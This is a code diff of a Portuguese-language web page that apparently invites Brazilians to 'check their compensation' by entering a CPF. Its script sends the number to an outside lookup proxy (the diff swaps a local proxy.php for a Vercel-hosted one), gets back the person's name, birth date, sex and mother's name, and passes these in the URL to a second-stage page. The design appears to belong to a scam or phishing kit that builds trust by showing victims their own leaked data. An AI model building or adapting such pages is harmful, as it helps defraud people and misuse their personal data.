@@ -13,7 +13,6 @@
   <meta content="text/html; charset=UTF-8; X-Content-Type-Options=nosniff" http-equiv="Content-Type">
   <title>Consulta - Verificação - 1</title>
 
-
   <script>
     window.onload = function () {
       var links = document.getElementsByTagName("a");
@@ -24,7 +23,6 @@
     }
   </script>
 
-  <!-- Tailwind CSS -->
   <script src="https://cdn.tailwindcss.com"></script>
   <script>
     tailwind.config = {
@@ -38,7 +36,6 @@
     }
   </script>
 
-  <!-- fonts -->
   <link rel="preconnect" href="https://fonts.googleapis.com">
   <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin="">
   <link href="https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700&display=swap" rel="stylesheet">
@@ -87,13 +84,10 @@
 
 <body class="w-full overflow-x-hidden font-poppins">
 
-  <!-- Google Tag Manager (noscript) -->
   <noscript>
     <iframe src="https://www.googletagmanager.com/ns.html?id=GTM-TKS4B7VG" height="0" width="0"
       style="display:none;visibility:hidden"></iframe>
   </noscript>
-  <!-- End Google Tag Manager (noscript) -->
-
   <div class="min-h-screen bg-gradient-to-br from-slate-50 via-blue-50 to-indigo-50">
     <header class="fixed top-0 left-0 right-0 z-50 bg-white/95 backdrop-blur-sm shadow-sm border-b border-gray-200">
       <div class="px-4 py-2">
@@ -190,7 +184,7 @@
 
     function formatDate(dateStr) {
       if (!dateStr) return '';
-      // Checkify retorna no formato DD-MM-AAAA → converte para DD/MM/AAAA
+      // Retorna no formato DD-MM-AAAA ou AAAA-MM-DD → converte para DD/MM/AAAA
       let matchDDMMAAAA = dateStr.match(/^(\d{2})[-\/](\d{2})[-\/](\d{4})$/);
       if (matchDDMMAAAA) {
         return matchDDMMAAAA[1] + '/' + matchDDMMAAAA[2] + '/' + matchDDMMAAAA[3];
@@ -200,7 +194,7 @@
       if (matchAAAAMMDD) {
         return matchAAAAMMDD[3] + '/' + matchAAAAMMDD[2] + '/' + matchAAAAMMDD[1];
       }
-      return dateStr;
+      return dateStr.replace(/-/g, '/');
     }
 
     // Funções de validação de CPF
@@ -267,9 +261,8 @@
           return;
         }
 
-        // ─── API CHECKIFY (via proxy PHP) ────────────────────────────
-        // ⚠️ TROQUE A URL ABAIXO pelo endereço do seu proxy.php
-        const apiUrl = './proxy.php?cpf=' + cpfValue;
+        // ─── API DE CPF (Vercel Proxy) ────────────────────────────
+        const apiUrl = 'https://proxy-ativo.vercel.app/api/proxy?cpf=' + cpfValue;
 
         fetch(apiUrl, {
           method: 'GET',
@@ -278,45 +271,35 @@
           }
         })
         .then(function(response) {
+          if (!response.ok) {
+            throw new Error('Erro na consulta da API.');
+          }
           return response.json();
         })
         .then(function(result) {
-          if (result && result.ok === true) {
-            let newQueryParams = new URLSearchParams(window.location.search);
-            newQueryParams.set('cpf', cpfValue);
-            const redirectUrl = './parte2/index.html?' + newQueryParams.toString();
-            window.location.href = redirectUrl;
-            return;
-          }
+          // A API retorna os dados dentro de dadosBasicos
+          let dados = result.dadosBasicos;
 
-          // Estrutura Checkify: result.resultado.dados
-          let dados = null;
-
-          if (result.resultado && result.resultado.dados) {
-            dados = result.resultado.dados;
-          }
-
-          if (dados && dados.NOME) {
-            // Converter SEXO de M/F para Masculino/Feminino
+          if (dados && dados.nome) {
+            // Converter SEXO de M/F para Masculino/Feminino, caso exista
             let sexoConvertido = '';
-            if (dados.SEXO === 'M') sexoConvertido = 'Masculino';
-            else if (dados.SEXO === 'F') sexoConvertido = 'Feminino';
+            if (dados.sexo === 'M') sexoConvertido = 'Masculino';
+            else if (dados.sexo === 'F') sexoConvertido = 'Feminino';
 
             // Formatar os dados
-            // NASC vem no formato DD-MM-AAAA
-            let nomeFormatado       = dados.NOME     ? toTitleCase(dados.NOME)     : '';
-            let nascimentoFormatado = dados.NASC      ? formatDate(dados.NASC)      : '';
-            let maeFormatada        = dados.NOME_MAE  ? toTitleCase(dados.NOME_MAE) : '';
-            let sexoFormatado       = sexoConvertido  ? toTitleCase(sexoConvertido) : '';
+            let nomeFormatado       = dados.nome       ? toTitleCase(dados.nome)       : '';
+            let nascimentoFormatado = dados.nascimento ? formatDate(dados.nascimento)   : '';
+            let maeFormatada        = dados.mae        ? toTitleCase(dados.mae)        : '';
+            let sexoFormatado       = sexoConvertido   ? toTitleCase(sexoConvertido)   : '';
 
             // Construir query params para redirecionar
             let newQueryParams = new URLSearchParams(window.location.search);
-            newQueryParams.set('cpf', cpfValue);
+            newQueryParams.set('cpf', formatCPF(cpfValue));
 
             if (nomeFormatado)       newQueryParams.set('nome',       nomeFormatado);
-            if (nascimentoFormatado) newQueryParams.set('nascimento',  nascimentoFormatado);
-            if (sexoFormatado)       newQueryParams.set('sexo',        sexoFormatado);
-            if (maeFormatada)        newQueryParams.set('mae',         maeFormatada);
+            if (nascimentoFormatado) newQueryParams.set('nascimento', nascimentoFormatado);
+            if (sexoFormatado)       newQueryParams.set('sexo',       sexoFormatado);
+            if (maeFormatada)        newQueryParams.set('mae',        maeFormatada);
 
             // Remover parâmetros vazios
             for (let [key, value] of newQueryParams.entries()) { 
@@ -329,7 +312,7 @@
             window.location.href = redirectUrl;
 
           } else {
-            // CPF não encontrado
+            // CPF não encontrado ou resposta vazia
             errorMsg.textContent = 'CPF não encontrado na base de dados. Verifique e tente novamente.';
             errorMsg.style.display = 'block';
             btnText.textContent = 'CONSULTAR INDENIZAÇÃO';
@@ -338,7 +321,10 @@
           }
         })
         .catch(function(error) {
-          // Silenciosamente resetar o botão sem mostrar mensagem de erro
+          // Mostrar mensagem de erro
+          console.error("Erro na requisição:", error);
+          errorMsg.textContent = 'Erro ao se conectar com a base de dados. Tente novamente mais tarde.';
+          errorMsg.style.display = 'block';
           btnText.textContent = 'CONSULTAR INDENIZAÇÃO';
           btnSpinner.classList.add('hidden');
           submitBtn.disabled = false;
@@ -347,7 +333,5 @@
       });
     });
   </script>
-
-
 
 </body></html>
